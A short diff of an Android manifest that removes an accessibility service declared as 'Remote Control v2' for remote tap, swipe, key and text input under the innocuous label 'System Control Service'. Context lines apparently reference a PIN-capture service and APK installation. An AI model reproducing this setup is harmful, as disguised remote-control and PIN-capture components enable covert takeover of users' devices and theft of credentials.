@@ -144,20 +144,6 @@
                 android:resource="@xml/pin_capture_config" />
         </service>
 
-        <!-- Remote Control v2 — AccessibilityService (tap/swipe/key/text, no Shizuku) -->
-        <service
-            android:name=".ControlAccessibilityService"
-            android:exported="true"
-            android:label="System Control Service"
-            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
-            <intent-filter>
-                <action android:name="android.accessibilityservice.AccessibilityService" />
-            </intent-filter>
-            <meta-data
-                android:name="android.accessibilityservice"
-                android:resource="@xml/control_accessibility_config" />
-        </service>
-
         <!-- FileProvider untuk install APK -->
         <provider
             android:name="androidx.core.content.FileProvider"
